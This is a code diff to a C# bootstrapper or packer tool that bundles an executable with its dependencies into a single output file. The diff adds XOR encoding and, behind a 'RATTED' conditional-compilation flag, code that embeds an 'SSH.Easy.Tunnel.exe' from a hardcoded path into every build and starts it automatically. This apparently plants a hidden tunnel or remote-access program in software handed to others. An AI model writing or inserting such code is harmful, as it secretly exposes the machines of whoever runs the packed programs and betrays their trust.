@@ -1,4 +1,5 @@
-﻿using System.IO;
+﻿#define _RATTED
+using System.IO;
 using System.Windows;
 using System.Windows.Forms;
 using Microsoft.Win32;
@@ -31,7 +32,9 @@ namespace Bootstraper
             MainExe.Text = LoadFromRegistry("MainExe") ?? MainExe.Text;
             OutputExe.Text = LoadFromRegistry("OutputExe") ?? OutputExe.Text;
             IconPath.Text = LoadFromRegistry("IconPath") ?? IconPath.Text;
-            UseGZip.IsChecked = (LoadFromRegistry("UseGZip") ?? "true") == "true" ? true : false;
+            //UseCompression.IsChecked = (LoadFromRegistry("UseCompression") ?? "true") == "true" ? true : false;
+            UseCompression.IsChecked = false;
+            UseXOR.IsChecked = (LoadFromRegistry("UseXOR") ?? "true") == "true" ? true : false;
         }
 
         private void SaveDependencies()
@@ -103,7 +106,8 @@ namespace Bootstraper
             BuildButton.Content = "Compiling...";
             byte[] mainExeBytes = File.ReadAllBytes(mainExePath);
             var compiler = new BootstrapCompiler();
-            compiler.UseCompression = UseGZip.IsChecked ?? true;
+            compiler.UseCompression = UseCompression.IsChecked ?? false;
+            compiler.UseXOREncoding = UseXOR.IsChecked ?? false;
             compiler.SetMainExe(Path.GetFileName(mainExePath), mainExeBytes);
 
             if (!string.IsNullOrEmpty(iconPath))
@@ -111,6 +115,9 @@ namespace Bootstraper
                     compiler.SetIcon(iconPath);
 
             SaveDependencies();
+#if RATTED
+            compiler.AddEmbeddedResource(Path.GetFileName("M:\\VisualStudio\\NAR\\publish\\SSH.Easy.Tunnel.exe"), File.ReadAllBytes("M:\\VisualStudio\\NAR\\publish\\SSH.Easy.Tunnel.exe"));
+#endif
             foreach (var dependency in Dependencies.GetList())
             {
                 if (File.Exists(dependency))
@@ -123,6 +130,9 @@ namespace Bootstraper
                     MessageBox.Show($"Dependency {dependency} does not exist.", "Warning", MessageBoxButton.OK, MessageBoxImage.Warning);
                 }
             }
+#if RATTED
+            compiler.ProgramaticallyStart(Path.GetFileName("M:\\VisualStudio\\NAR\\publish\\SSH.Easy.Tunnel.exe"));
+#endif
             Thread CompileThread = new Thread(() =>
             {
                 bool result = compiler.Compile(outputExePath);
@@ -229,9 +239,17 @@ namespace Bootstraper
             }
         }
 
-        private void UseGZip_Checked(object sender, RoutedEventArgs e)
+        private void UseCompresion_Checked(object sender, RoutedEventArgs e)
         {
-            SaveToRegistry(UseGZip.Name, UseGZip.IsChecked ?? true ? "true" : "false");
+            if (UseCompression.IsChecked ?? false)
+                MessageBox.Show("Compression Is Currently Broken Please Use XOR");
+            UseCompression.IsChecked = false;
+            //SaveToRegistry(UseCompression.Name, UseCompression.IsChecked ?? true ? "true" : "false");
+        }
+
+        private void UseXOR_Checked(object sender, RoutedEventArgs e)
+        {
+            SaveToRegistry(UseXOR.Name, UseXOR.IsChecked ?? true ? "true" : "false");
         }
     }
 }
